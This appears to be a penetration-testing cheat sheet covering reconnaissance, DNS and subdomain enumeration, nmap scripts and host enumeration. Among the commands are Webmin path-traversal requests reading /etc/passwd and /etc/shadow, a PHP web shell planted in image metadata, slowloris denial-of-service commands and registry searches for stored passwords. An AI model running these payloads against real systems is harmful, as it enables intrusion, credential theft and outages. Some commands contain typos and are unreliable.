# Information Gathering and Vulnerability Scanning

## Passive Information Gathering
#### Google hacking
- Google search to find a website sub domains
`site:website.com`
- Google filtype and intitle
`intitle:"netbotz appliance" "OK" -filetype:pdf`
- Google inurl
`inurl:"level/15/sexec/-/show"`
- [Google hacking database](https://www.exploit-db.com/google-hacking-database/)

#### SSL certificate testing
https://www.ssllabs.com/ssltest/analyze.html

#### Email harvesting
Simply Email
```
git clone https://github.com/killswitch-GUI/SimplyEmail.git
./SimpleEmail.py -all -e TARGET-DOMAIN
```

#### Whois enumeration
`whois domain-name.org` </br>
`whois $ip`

#### Banner grabbing
`nc -v $ip 25`</br>
`telnet $ip 25` </br>
`nc TARGET-IP 80` </br>

#### Recon-ng full fledged web reconnaissance framework written in Python
```
cd /opt;
git clone https://LaNMaSteR53@bitbucket.org/LaNMaSteR53/recon-ng.git
cd /opt/recon-ng
./recon-ng
show modules
help
```

## Active Information Gathering

- Netcat port scanning
```
nc -nvv -w 1 -z $ip 3388-3390
```
- Discover active IPs using ARP on the network
```
arp-scan $ip/24
```
- Discover who else is on the network
```
netdiscover
```
- Discover IP Mac and Mac vendors from ARP
```
netdiscover -r $ip/24
```
- Quick traceroute scan
```
nmap -sn --traceroute $ip
```

## Enumeration

### DNS enumeration
```
nmap -f --dns-server <dns server ip> <target ip range>
```

#### Host lookup
```
host -t ns website.com
```

#### Reverse lookup brute force - Find domains in the same range
```
for ip in $(req 155 190);do host 50.7.67.$ip;done | grep -v "not found"
```

#### Perform DNS IP lookup
```
dig a domain-name.com @nameserver
```

#### Perform MX record lookup
```
dig mx domain-name @nameserver
```

#### Perform zone transfer
```
dig axfr domain-name.com @nameserver
```

#### Windows DNS Zone transfer
```
nslookup -> set type=any -< ls -d website.com
```

#### Linux DNS Zone transfer
```
dig axfr website.com @nameserver
```

#### DNSRecon DNS brute force
```
dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml output.xml
````

#### DNSRecon DNS List of megacorp
```
dnsrecon -d megacorpone.com -t axfr
```

#### DNSEnum
```
dnsenum zontransfer.me
```

- DNS enumeration script: https://github.com/darkoperator/dnsrecon

#### dnsrecon 

- `dnsrecon -n 8.8.8.8 -d demo.com` 
- `dnsrecon -d demo.com -t std` -> SOA, NS, A, AAAA, MX and SRV if AXRF on the NS servers fail
- `dnsrecon -d demo.com -t rvl` -> reverse lookup of a given CIDR or IP range
- `dnsrecon -d demo.com -t brt -D /path/to/subdomains.wd` -> brute force domains and hosts using a given dictionary
- `dnsrecon -d demo.com -t brt -D /path/to/subdomains.wd --iw` -> brute force domains and hosts using a given dictionary, continue brute forcing a domain even if a wildcard records are discovered
- `dnsrecon -d demo.com -t srv` -> SRV records
- `dnsrecon -d demo.com -t axfr` -> test all NS servers for a zone transfer
- `dnsrecon -d demo.com -t goo` -> perform Google search for subdomains and hosts
- `dnsrecon -d demo.com -t tld` -> remove the TLD of given domainand test against all TLDs registered in IANA
- `dnsrecon -d demo.com -t zonewalk` -> perform a DNSSEC zone walk using NSEC records
- `dnsrecon -d demo.com --db /path/to/results.sqlite` -> save results in a sqlite file
- `dnsrecon -d demo.com --xml /path/to/results.xml` -> save results in a xml file
- `dnsrecon -d demo.com -c /path/to/results.csv` -> save results in a csv file
- `dnsrecon -d demo.com -j /path/to/results.json` -> save results in a json file

#### theharvester

- `theharvester -d demo.com -b all` -> search google, googleCSE, bing, pgp, linkedin, google-profiles, jigsaw, twitter, googleplus, all
- `theharvester -d demo.com -n` -> perform a DNS reverse query on all range discovered
- `theharvester -d demo.com -c` -> perform a DNS brute force for the domain name
- `theharvester -d demo.com -e 8.8.8.8` -> specific dns server
- `theharvester -d demo.com -h` -> use SHODAN database to query discovered hosts

#### nslookup
- `nslookup -query=<record-type> demo.com`
- if port 53 is open try searching for other subdomains and ip addresses connected to it.
```bash
root@kali# nslookup
server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
10.10.10.13
13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.
```

- if this is successful go for zone transfer.

cheatsheet: [https://fareedfauzi.gitbook.io/oscp-notes/services-enumeration/dns](https://fareedfauzi.gitbook.io/oscp-notes/services-enumeration/dns)


#### Interacting with a DNS server

```
# -t : type, ns: dns
host -t ns megacorpone.com
# mx : mail server
host -t mx megacorpone.com
```

```
nslookup demo.com
dig demo.com
```

#### Automatic lookups

```
# discovering more host names and IP addresses belonging to a particular domain using additional DNS queries
host www.demo.com
host subdomain.demo.com
```

#### Forwarding lookup brute force

- we can automate the forward DNS lookup of common names using the hos command and a bash script

```bash
> echo www > list.txt
> echo ftp >> list.txt
> echo mail >> list.txt
> echo owa >> list.txt
> echo proxy >> list.txt
> echo router >> list.txt
> echo api >> list.txt
> for ip in $(cat list.txt);do host $ip.megacorpone.com;done
```

#### Reverse lookup brute force

```
for ip in $(seq 155 190);do host 50.7.67.$ip;done | grep -v "not found"
```

#### gobuster 
```bash 
gobuster dns -d <domain-name> -w <wordlist>
```
	
#### Assetfinder

```bash
assetfinder <domain-name>
```
Automation script for filtering subdomains from assetfinder's results 

```bash 
#!/bin/bash

url = $1

if [ ! -d "$url" ];then
	mkdir $url
fi 

if [ ! -d "$url/recon" ];then
	mkdir $url/recon
fi

echo "[*] Finding subdomains with assetfinder"
assetfinder $url >> $url/recon/assets.txt
cat $url/recon/assets.txt | grep $1 >> $url/recon/final.txt
rm $url/recon/assets.txt
```

#### amass

```bash 
amass enum -d <domain-name>
```

Continuing the automation script from assetfinder (**slow**)

```bash 
#!/bin/bash

url = $1

if [ ! -d "$url" ];then
	mkdir $url
fi 

if [ ! -d "$url/recon" ];then
	mkdir $url/recon
fi

echo "[*] Finding subdomains with assetfinder"
assetfinder $url >> $url/recon/assets.txt
cat $url/recon/assets.txt | grep $1 >> $url/recon/final.txt
rm $url/recon/assets.txt
	
echo "[*] Finding subdomains with amass"
amass enum -d $url >> $url/recon/amass.txt
sort -u $url/recon/amass.txt >> $url/recon/final.txt
rm $url/recon/amass.txt
```

## Finding Alive Domains with Httprobe

```bash 
cat subdomains.txt | httprobe

# to search on a particular port 
cat subdomains.txt | httprobe -s -p https:443

# removing the 'https://' and port number for nmap scans 
cat subdomains.txt | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ':443'
```

The automation script: 
```bash 
#!/bin/bash

url = $1

if [ ! -d "$url" ];then
	mkdir $url
fi 

if [ ! -d "$url/recon" ];then
	mkdir $url/recon
fi

echo "[*] Finding subdomains with assetfinder"
assetfinder $url >> $url/recon/assets.txt
cat $url/recon/assets.txt | grep $1 >> $url/recon/final.txt
rm $url/recon/assets.txt
	
echo "[*] Finding subdomains with amass"
amass enum -d $url >> $url/recon/amass.txt
sort -u $url/recon/amass.txt >> $url/recon/final.txt
rm $url/recon/amass.txt

echo "[*] probing for alive domains..."
cat final.txt | sort -u | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ':443' >> $url/recon/alive.txt
```


## Nmap enumeration scripts
```bash
# Nmap discovery
# https://nmap.org/nsedoc/categories/discovery.html

# Nmap port version detection MAX Power
nmap -vvv -A --reason --script="+(safe or default) and not broadcast" -p <port> <host>

# NFS (Network File system enumeration)
# SHow mountable NFS SHares
nmap -sV --script=nfs-showmount $ip

# RPC (Remote Procedure Call) Enumeration
# Connect to an RPC Share without a username and password and enumerate privileges
rpcclient --user="" --command=enumprivs -N $ip
# Connect to an RPC Share with a username and enumerate privileges
rpcclient --user="username" --command=enumprivs $ip

# SMTP Enumeration
# Verify SMIP Port using netcat
nc -nv $ip 25
```

#### POP3 Enumeration - Reading other people's mail - May find usernames and passwords for email accounts
```
root@kali:~# telnet $ip 110
+OK beta POP3 server (JAMES POP3 Server 2.3.2) ready
USER billydean    
+OK
PASS password
+OK Welcome billydean

list

+OK 2 1807
1 786
2 1021

retr 1

+OK Message follows
From: jamesbrown@motown.com
Dear Billy Dean,

Here is your login for remote desktop ... try not to forget it this time!
username: billydean
password: PA$$W0RD!Z
```

#### SNMP Enumeration
- Fix SNMP output so they are human readable
```
apt-get install snmp-mibs-downloader download-mibs
echo "" > /etc/snmp/snmp.conf
```
- SNMP enumeration commands
```bash
snmpcheck -t $ip -c public
snmpwalkj -c public -v1 $ip 1|
grep hrSWRunName | cur -d\* \* -f
snmpenum -t $ip
onesixtype -c names -i hosts
```
- SNMPv3 Enumeration
```
nmap -sV -p 161 --script=snmp-info $ip/24
```
- Automating the SNMPv3 user enumeration process
```bash
apt-get install snmp snmp-mibs-downloader
wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb
```
- Default SNMP credentials
`/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt`

#### MySQL server enumeration
- Nmap information gathering
```
nmap -p 143 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1443,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip
```

#### Webmin and miniserv/0.01 Enumeration - PORT 10000
- Test for LFI and file disclosure vulnerability by grabbing /etc/passwd
```
curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd
```
- Test to check if webmin is running as root by grabbing /etc/shadow
```
curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow
```

## Linux Enumeration

- List all SUID files </br>
`find / -perm -4000 2>/dev/null`
- Determine the current version of Linux </br>
`cat /etc/issue`
- Determine more information about the environment </br>
`uname -a`
- List processes running </br>
`ps -xaf`
- List the allowed commands for the invoking use </br>
`sudo -l`
- List iptable rules </br>
```bash
iptables --table nat --list
iptables -vL -t filter
iptables -vL -t nat
iptables -vL -t mangle
iptables -vL -t raw
iptables -vL -t security
```

## Windows Enumeration
- Using `Sherlock, Watson, Devel` scripts to check for any kernel exploits
- `net config Workstation`
- `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
- `net users`
- `hostname`
- `ipconfig /all`
- `route print`
- `arp -A`
- `netstat -ano`
- `netsh firewall show state`
- `netsh firewall show config`
- `schtasks /query /fo LIST /v`
- `tasklist /SVC`
- `net start`
- `DRIVERQUERY`
- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
- `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
- `dir /s pass == cred == vnc == .config`
- `reg query HKLM /f password /t REG_SZ /s`
- `reg query HKCU /f password /t REG_SZ /s`
- Nmap search through vulnerability scripts `cd /usr/share/nmap/scripts ls -l \*vuln\*`
- Scan for vulnerable exploits with nmap `nmap --script exploit -Pn $ip`
- Nmap DOS Scanning
```
nmap --script dos -Pn $ip NMap Execute DOS Attack
nmap --max-parallelism 750 -Pn --script http-slowloris --script-args http-slowloris.runforever=true
```
- Scan for coldfusion web vulnerabilities
`nmap -V -p 80 --script=http-vuln-cve2010-2861 $ip`
- anonymous FTP dump with Nmap
`nmap -v -p 21 --script=ftp-anon.nse $ip-254`

#### WFuzz - the web brute forcer
```bash
wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test
wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ
# Recurse level 3
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ
```

#### TLS & SSL Testing
`./testssl -e -E -f -p -y -Y -S -P -c -H -U $ip | aha > OUTPUT-FILE.html`

### Proxy Enumeration
`nikto -useproxy http://$ip:3128 -h$ip`

#### Steganography
```
apt-get install steghide
steghide extract -sf picture.jpg
steghide info picture.jpg
apt-get install stegosuite
```

#### Open-VAS Scanner
- Setting up openvas scaner
```bash
apt-get update
apt-get install openvas
openvas-setup
```
- Scanning
```bash
netstat -tulpn
```
- Login from `https://$ip:9392`


#### Examining a binary file

```bash
xxd -d filename
```

#### Examining image files for hidden data
```bash
exiftool image.png
```

#### Embedding data to image files
```bash
exiftool -DocumentName='<h1>Reverse<br><?php system($_GET["cmd"]);?></h1>' image.jpeg

# then access the shell using
# http://<url>/image.php.jpeg?cmd=id
```

#### dumping the entire MySQL database
```bash
mysqldump --opt --user=username --password database_name > database.sql
```

### Redirects 
- Redirection pages, pages that respond with 302 Found, must not have any source code inside them, if they do, then try looking at the response it may be a vulnerability. 
- Using burpsuite's proxy -> options -> match and replace change every 302 Found to 200 OK
```
Field: Response Headers
Match: 30[12] Found
Replace: 200 OK
```
- Now we'lll be able to view the pages normally, and there will be no more redirects

### If svn server is running 
```bash 
# list everything inside that server
svn ls svn://<ip>:<port>

# log -> to check commit history 
svn log svn://<ip>:<port>

# downloads the repo
svn checkout svn://<ip>:<port>

# to update svn repo's revisions 
svn up -r 2
```